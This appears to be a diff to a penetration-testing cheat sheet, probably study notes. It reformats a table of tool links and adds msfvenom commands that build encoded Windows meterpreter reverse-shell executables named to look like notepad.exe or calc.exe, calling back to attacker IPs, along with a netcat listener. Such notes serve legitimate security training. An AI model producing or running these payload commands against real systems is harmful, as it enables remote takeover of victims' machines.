@@ -123,12 +123,13 @@
 
 ## IV. Exploitation Frameworks & Web Exploitation
 
-| Link # | Title | Description | Link |
-| :--- | :--- | :--- | :--- |
-| 1 | Metasploit Console Commands – OffSec | Reference for the Metasploit Framework command line. | [offsec.com](https://www.offsec.com/metasploit-unleashed/msfconsole-commands/) |
-| 10 | Burp Suite - Intercept HTTP traffic | Documentation on using the Burp proxy for HTTP/S traffic interception. | [portswigger.net](https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic) |
-| 32 | Impacket GitHub Repository | Python classes for working with network protocols (e.g., SMB, MSRPC). | [fortra/impacket](https://github.com/fortra/impacket) |
-| 33 | PowerSploit Documentation | PowerShell modules for penetration testing. | [powersploit.readthedocs.io](https://powersploit.readthedocs.io/en/latest/) |
+| Title | Description | Link |
+| :--- | :--- | :--- |
+Metasploit Console Commands – OffSec | Reference for the Metasploit Framework command line. | [offsec.com](https://www.offsec.com/metasploit-unleashed/msfconsole-commands/) |
+Burp Suite - Intercept HTTP traffic | Documentation on using the Burp proxy for HTTP/S traffic interception. | [portswigger.net](https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic) |
+Impacket GitHub Repository | Python classes for working with network protocols (e.g., SMB, MSRPC). | [fortra/impacket](https://github.com/fortra/impacket) |
+PowerSploit Documentation | PowerShell modules for penetration testing. | [powersploit.readthedocs.io](https://powersploit.readthedocs.io/en/latest/) |
+MSF Venon |  The combination of payload generation and encoding. |  https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html|
 
 ### Metasploit Commands
 -   `msfconsole`
@@ -139,6 +140,17 @@
 -   `meterpreter` (Post-exploitation shell)
 
 ---
+### MSFVenon
+`cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw`
+`./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe`
+ msfvenom -a x64 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=10.233.21.40 LPORT=4455 --smallest -f exe -o /home/cyberuser/notepad.exe
+  msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=<kali_IP_address> LPORT=4455 --smallest -f exe -o /home/cyberuser/notepad.exe
+  msfvenom -a x86 --platform windows -p windows/meterpreter_reverse_tcp -e x86/shikata_ga_nai LHOST=<kali_IP_address> LPORT=4455 --smallest -f exe -o /home/cyberuser/calc.exe 
+
+  nc -lvp 6655
+
+   msfvenom -p payload_name --list-options
+    msfvenom -l formats 
 
 ## V. Windows/SMB & Active Directory Enumeration & Exploitation
 
